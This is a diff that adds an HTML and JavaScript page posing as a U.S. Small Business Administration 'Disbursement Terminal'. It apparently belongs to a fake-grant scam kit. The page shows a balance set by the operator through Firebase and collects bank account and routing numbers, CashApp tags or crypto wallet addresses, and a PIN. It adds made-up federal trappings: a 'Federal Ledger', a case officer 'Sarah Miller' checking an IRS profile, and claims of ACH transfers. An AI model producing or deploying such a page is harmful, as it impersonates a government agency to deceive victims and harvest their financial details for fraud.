@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA | Terminal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
+        :root { --sba-navy: #002e6d; --sba-red: #cc0000; --bg: #f4f7f9; }
+        body { background: var(--bg); font-family: 'Public Sans', sans-serif; color: #0f172a; margin: 0; -webkit-font-smoothing: antialiased; }
+
+        /* Branding */
+        .header-container { background: white; padding: 12px 20px; display: flex; align-items: center; border-bottom: 3px solid var(--sba-navy); position: sticky; top: 0; z-index: 1000; }
+        .sba-logo-sm { width: 35px; height: 35px; position: relative; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .logo-text-sm { font-size: 12px; font-weight: 900; color: var(--sba-navy); z-index: 5; }
+        .brk-top { position: absolute; top: 0; right: 0; width: 70%; height: 40%; border-top: 3px solid var(--sba-navy); border-right: 3px solid var(--sba-navy); }
+        .brk-btm { position: absolute; bottom: 0; left: 0; width: 70%; height: 40%; border-bottom: 3px solid var(--sba-red); border-left: 3px solid var(--sba-red); }
+
+        .app-card { background: white; border-radius: 24px; padding: 25px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 15px 35px rgba(0,0,0,0.05); }
+        
+        /* Method Selector */
+        .m-btn { border: 2px solid #e2e8f0; border-radius: 15px; padding: 12px 5px; cursor: pointer; text-align: center; transition: 0.3s; background: #fff; }
+        .m-btn.active { border-color: var(--sba-navy); background: #f0f7ff; box-shadow: 0 4px 12px rgba(0,46,109,0.1); }
+        .m-btn i { font-size: 18px; margin-bottom: 6px; display: block; color: #64748b; }
+        .m-btn.active i { color: var(--sba-navy); }
+        .m-btn span { font-size: 9px; font-weight: 900; text-transform: uppercase; display: block; }
+
+        /* Inputs */
+        .label-text { font-size: 9px; font-weight: 900; color: #64748b; text-transform: uppercase; margin-bottom: 6px; display: block; margin-left: 4px; }
+        .s-input { width: 100%; height: 50px; background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 12px; padding: 0 15px; font-size: 14px; font-weight: 700; margin-bottom: 15px; outline: none; transition: 0.3s; }
+        .s-input:focus { border-color: var(--sba-navy); background: #fff; }
+
+        /* Buttons */
+        .btn-fed { background: var(--sba-navy); color: white; font-weight: 900; text-transform: uppercase; width: 100%; height: 60px; border-radius: 15px; border-bottom: 5px solid #001530; cursor: pointer; font-size: 13px; margin-top: 10px; }
+        .btn-success { background: #10b981; color: white; font-weight: 900; text-transform: uppercase; width: 100%; height: 55px; border-radius: 15px; border-bottom: 5px solid #065f46; cursor: pointer; }
+        
+        /* Rejection Box */
+        .decline-reason { background: #fff1f2; border-left: 5px solid #e11d48; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
+
+        #loader { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    </style>
+</head>
+<body class="pb-20">
+
+    <div id="loader">
+        <div class="sba-logo-sm"><div class="brk-top"></div><div class="logo-text-sm">SBA</div><div class="brk-btm"></div></div>
+        <p class="mt-4 text-[10px] font-black animate-pulse uppercase tracking-widest text-slate-400">Syncing Federal Ledger...</p>
+    </div>
+
+    <header class="header-container">
+        <div class="sba-logo-sm"><div class="brk-top"></div><div class="logo-text-sm">SBA</div><div class="brk-btm"></div></div>
+        <div class="ml-3">
+            <h1 class="text-[10px] font-black leading-none text-[#002e6d] uppercase">Disbursement Terminal</h1>
+            <p class="text-[7px] font-bold text-slate-400 uppercase tracking-tighter">Port 7-B Secured</p>
+        </div>
+        <div class="ml-auto text-right">
+            <p class="text-[8px] font-black text-slate-400 uppercase">Balance</p>
+            <p class="text-sm font-black text-slate-800">$<span id="bal">0.00</span></p>
+        </div>
+    </header>
+
+    <main class="max-w-md mx-auto">
+        <div class="app-card">
+            
+            <div id="reason-box" class="hidden decline-reason">
+                <div class="flex gap-3 text-rose-800">
+                    <i class="fas fa-exclamation-circle mt-1"></i>
+                    <div>
+                        <p class="text-[10px] font-black uppercase">Transaction Declined & Refunded</p>
+                        <p id="decline-text" class="text-[11px] font-bold mt-1">...</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="setupView" class="hidden text-center">
+                <h2 class="text-sm font-black uppercase text-slate-700 mb-6 italic">Secure Transfer Pin</h2>
+                <label class="label-text text-center">Create 4-Digit Security Key</label>
+                <input type="tel" id="regPin" maxlength="4" class="s-input text-center text-2xl tracking-[15px]" placeholder="****">
+                <button onclick="savePin()" class="btn-fed">Initialize Node</button>
+            </div>
+
+            <div id="formView" class="hidden">
+                <h2 class="text-[11px] font-black uppercase text-slate-400 tracking-widest mb-5 flex items-center gap-2">
+                    <span class="w-1.5 h-4 bg-sba-red"></span> Allocation Settings
+                </h2>
+
+                <div class="grid grid-cols-3 gap-3 mb-6">
+                    <div class="m-btn active" id="mBank" onclick="setM('BANK')"><i class="fas fa-university"></i><span>Bank</span></div>
+                    <div class="m-btn" id="mCash" onclick="setM('CASHAPP')"><i class="fas fa-dollar-sign"></i><span>CashApp</span></div>
+                    <div class="m-btn" id="mCrypto" onclick="setM('CRYPTO')"><i class="fab fa-bitcoin"></i><span>Crypto</span></div>
+                </div>
+
+                <div id="fields">
+                    <div id="f_bank">
+                        <label class="label-text">Account Holder</label><input type="text" id="b_name" class="s-input" placeholder="Full Legal Name">
+                        <label class="label-text">Bank Institution</label><input type="text" id="b_bank" class="s-input" placeholder="Bank Name">
+                        <div class="grid grid-cols-2 gap-3">
+                            <div><label class="label-text">Account No.</label><input type="tel" id="b_acc" class="s-input"></div>
+                            <div><label class="label-text">Routing No.</label><input type="tel" id="b_rout" class="s-input"></div>
+                        </div>
+                    </div>
+                    <div id="f_cash" class="hidden">
+                        <label class="label-text">CashApp Tag</label><input type="text" id="c_tag" class="s-input" placeholder="$Username">
+                    </div>
+                    <div id="f_crypto" class="hidden">
+                        <label class="label-text">BTC/USDT Wallet Address</label><input type="text" id="cr_addr" class="s-input" placeholder="Paste Wallet String">
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-2 gap-4 mt-2">
+                    <div><label class="label-text">Amount to Release</label><input type="number" id="w_amt" class="s-input" placeholder="0.00"></div>
+                    <div><label class="label-text">Security Pin</label><input type="tel" id="w_pin" maxlength="4" class="s-input text-center tracking-[8px]" placeholder="****"></div>
+                </div>
+                <button id="sendBtn" onclick="sendW()" class="btn-fed">Transmit to Audit Office</button>
+            </div>
+
+            <div id="pendingView" class="hidden text-center py-10">
+                <div class="w-16 h-16 border-4 border-[#002e6d] border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+                <h3 class="font-black text-sm uppercase italic">Verification Pending</h3>
+                <p class="text-[10px] text-slate-500 font-bold mt-3 px-6 uppercase leading-relaxed">Agent Sarah Miller is cross-referencing this disbursement with your IRS Tax Profile.</p>
+                <div class="mt-8 pt-6 border-t border-slate-100">
+                    <p class="text-[8px] font-black text-slate-300 uppercase">Reference ID</p>
+                    <p class="text-[10px] font-mono font-bold text-slate-600" id="ref-id">---</p>
+                </div>
+            </div>
+
+            <div id="successView" class="hidden text-center py-8">
+                <div class="w-20 h-20 bg-emerald-50 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <i class="fas fa-check-double text-3xl"></i>
+                </div>
+                <h3 class="font-black text-lg uppercase text-slate-800">Funds Released</h3>
+                <p class="text-[10px] text-slate-500 font-bold mt-3 px-6 uppercase leading-relaxed">Disbursement successful. Funds have been transmitted via the Federal Reserve ACH network.</p>
+                <div class="mt-8 space-y-3">
+                    <button onclick="reopenForm()" class="btn-success">New Disbursement</button>
+                    <a href="dashboard.html" class="block text-[10px] font-black text-slate-400 uppercase underline">Back to Dashboard</a>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="px-5">
+            <div class="bg-white p-4 rounded-2xl border border-slate-200 flex items-center gap-4 shadow-sm">
+                <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=80" class="w-10 h-10 rounded-lg grayscale object-cover">
+                <div class="flex-1">
+                    <p class="text-[10px] font-black text-slate-800 uppercase">Sarah Miller</p>
+                    <p class="text-[8px] font-bold text-blue-700 uppercase">Case Officer</p>
+                </div>
+                <a href="support.html" class="text-blue-600"><i class="fas fa-headset"></i></a>
+            </div>
+        </div>
+    </main>
+
+    <script type="module">
+        import { auth, db } from './firebase-config.js';
+        import { doc, onSnapshot, updateDoc, increment } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        let bal = 0, pin = "", method = "BANK", currentAmt = 0;
+
+        onAuthStateChanged(auth, (user) => {
+            if (!user) { window.location.href = "login.html"; return; }
+            document.getElementById('ref-id').innerText = user.uid.substring(0,14).toUpperCase();
+
+            onSnapshot(doc(db, "users", user.uid), async (snap) => {
+                document.getElementById('loader').style.display = 'none';
+                const d = snap.data(); if(!d) return;
+                
+                bal = d.balance || 0; 
+                pin = d.securityPin || ""; 
+                currentAmt = d.withdrawAmount || 0;
+                document.getElementById('bal').innerText = Number(bal).toLocaleString();
+
+                const views = ['setupView', 'formView', 'pendingView', 'successView'];
+                views.forEach(v => document.getElementById(v).classList.add('hidden'));
+                document.getElementById('reason-box').classList.add('hidden');
+
+                if(!pin) {
+                    document.getElementById('setupView').classList.remove('hidden');
+                } else if(d.withdrawStatus === 'SUCCESSFUL' || d.withdrawStatus === 'APPROVED') {
+                    document.getElementById('successView').classList.remove('hidden');
+                } else if(d.withdrawStatus === 'PENDING') {
+                    document.getElementById('pendingView').classList.remove('hidden');
+                } else if(d.withdrawStatus === 'DECLINED' || d.withdrawStatus === 'FAILED') {
+                    // REFUND LOGIC: If declined, return money and clear status
+                    if(currentAmt > 0) {
+                        await updateDoc(doc(db, "users", user.uid), {
+                            balance: increment(currentAmt),
+                            withdrawAmount: 0,
+                            withdrawStatus: "IDLE"
+                        });
+                    }
+                    document.getElementById('formView').classList.remove('hidden');
+                    if(d.withdrawNote) {
+                        document.getElementById('reason-box').classList.remove('hidden');
+                        document.getElementById('decline-text').innerText = d.withdrawNote;
+                    }
+                } else {
+                    document.getElementById('formView').classList.remove('hidden');
+                }
+            });
+        });
+
+        window.setM = (m) => {
+            method = m;
+            document.querySelectorAll('.m-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('m' + (m === 'BANK' ? 'Bank' : (m === 'CASHAPP' ? 'Cash' : 'Crypto'))).classList.add('active');
+            ['f_bank', 'f_cash', 'f_crypto'].forEach(f => document.getElementById(f).classList.add('hidden'));
+            document.getElementById('f_' + m.toLowerCase()).classList.remove('hidden');
+        };
+
+        window.savePin = async () => {
+            const p = document.getElementById('regPin').value;
+            if(p.length !== 4) return alert("Security Pin must be 4 digits");
+            await updateDoc(doc(db, "users", auth.currentUser.uid), { securityPin: p });
+        };
+
+        window.reopenForm = async () => {
+            await updateDoc(doc(db, "users", auth.currentUser.uid), { withdrawStatus: "IDLE", withdrawAmount: 0 });
+        };
+
+        window.sendW = async () => {
+            const amt = Number(document.getElementById('w_amt').value);
+            const wPin = document.getElementById('w_pin').value;
+
+            if(!amt || amt <= 50) return alert("Minimum withdrawal is $50");
+            if(amt > bal) return alert("Insufficient Allocation Balance");
+            if(wPin !== pin) return alert("Incorrect Security Pin");
+
+            document.getElementById('sendBtn').innerText = "TRANSMITTING...";
+            document.getElementById('sendBtn').disabled = true;
+
+            let details = "";
+            if(method === 'BANK') details = `BANK: ${document.getElementById('b_bank').value} | ACC: ${document.getElementById('b_acc').value} | ROUT: ${document.getElementById('b_rout').value} | HOLDER: ${document.getElementById('b_name').value}`;
+            else if(method === 'CASHAPP') details = `CASHAPP: ${document.getElementById('c_tag').value}`;
+            else details = `CRYPTO: ${document.getElementById('cr_addr').value}`;
+
+            await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                balance: increment(-amt),
+                withdrawAmount: amt,
+                withdrawStatus: "PENDING",
+                withdrawMethod: method,
+                withdrawDetails: details,
+                withdrawDate: new Date().toLocaleString()
+            });
+        };
+    </script>
+</body>
+</html>
